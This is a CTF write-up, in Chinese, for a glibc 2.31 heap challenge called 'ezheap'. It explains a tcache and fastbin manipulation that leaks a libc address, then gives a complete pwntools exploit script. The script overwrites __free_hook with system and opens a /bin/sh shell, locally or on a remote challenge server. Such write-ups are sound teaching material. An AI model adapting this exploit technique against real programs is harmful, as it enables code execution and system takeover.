# W4 ezheap

## 文件分析

下载`ezheap`, 保护全开  
ghidra分析为64位程序

## 逆向

是一个note录入程序，很明显是堆题

libc是2.31，有tcache，有tcache校验，不方便double free；hook还在，考虑利用

tcathe能存7个相同size的chunk，先消耗掉，就可以把接下去分配的chunk放到
fastbin 里，然后通过分配大chunk来把fastbin里的chunk扫到smallbin里，
smallbin里就有libc，拿到libcBase就可以求偏移改hook，调system

这道题的限制:  
notebook有限，可以通过分配与note结构一样大的 "字符串"
来快速消耗tcache；  
edit函数检验了note的首项，如果不经修改，就是fd，
无法成功利用，需要先伪造note结构通过检验，还要把字符串地址改为freeHook，
就能把system写进freeHook里；  
freeHook还不在debug符号里，需要自己推出来

## EXPLOIT

```python
from pwn import *
lo = 1

if lo:
    sh = process('ezheap')
    gdb.attach(sh)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc-2.31.so')
else:
    sh = remote('node4.buuoj.cn', 25961)
    libc = ELF('libc-2.31.so')

def addn(idx:int, size:int, note:bytes=b'what'):
    sh.recvuntil(b'>>')
    sh.sendline(b'1')
    sh.recvuntil(b'idx')
    sh.sendline(str(idx).encode())
    sh.recvuntil(b'size')
    sh.sendline(str(size).encode())
    sh.recvuntil(b'note')
    sh.sendline(note)

def deln(idx:int):
    sh.recvuntil(b'>>')
    sh.sendline(b'2')
    sh.recvuntil(b'idx')
    sh.sendline(str(idx).encode())

def show(idx:int):
    sh.recvuntil(b'>>')
    sh.sendline(b'3')
    sh.recvuntil(b'idx')
    sh.sendline(str(idx).encode())

def edit(idx:int, note:bytes):
    sh.recvuntil(b'>>')
    sh.sendline(b'4')
    sh.recvuntil(b'idx')
    sh.sendline(str(idx).encode())
    sh.recvuntil(b'ent')
    sh.sendline(note)

addn(0, 64)
addn(1, 64)
addn(2, 64)
addn(3, 64)
addn(4, 64)
addn(5, 64)
addn(6, 64)
addn(7, 64)
addn(8, 64)
deln(6)
deln(5)
deln(4)
deln(3)
deln(2)
deln(1)
deln(0)
deln(8)
deln(7)
"""
bins now:
inuse: (size 0x51) 0 ~ 8
tcache: head -> 0 -> 1 -> 2 -> 3 -> 4 -> 5 -> 6 (full)
fastbin: head -> 7 -> 8
"""

addn(9, 1024)       #0 huge chunk to trigger malloc consolidate
"""
bins now:
inuse: ...
tcache: head -> 1 -> 2 -> 3 -> 4 -> 5 -> 6
small bins: head <-> 7 <-> 8 <-> tail
"""
addn(10, 64)        #1
addn(11, 32)        #2, 3 alloc 0x20 unit to consume bins quickly
addn(12, 32)        #4, 5
addn(13, 32, b'\n') #6, 8 FIFO; '\n' to avoid writing on fd
edit(13, b'')       # write a '\n' in the end (will be amended below)
show(13)            # chunk 8 in small bins, fd is libc addr

sh.recvuntil(b'(0~15): \n') # skip

# find offset first
dumpArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2
print('main_arena in libc:', hex(dumpArena))

# read and shift addr to libcBase
mainArena = u64(sh.recv(6) + b'\0\0') - 0x0a - 0x80 # sub '\n' & small bin offset
print('main_arena  actual:', hex(mainArena))
libcBase = mainArena - dumpArena
freeHook = libcBase + libc.symbols['__free_hook']
systemAddr = libcBase + libc.symbols['system']

edit(11, p64(64) + b'0'*0x10 + p64(freeHook)) # forge notebook[3], notebook[3] -> str = freeHook
edit(12, b'/bin/sh\0')                        # forge notebook[5] as the arg of system
edit(3, p64(systemAddr))                      # notebook[3] -> size == sizes[3] => *freeHook = systemAddr
deln(5)                                       # trigger freeHook

sh.interactive()
```

Done.
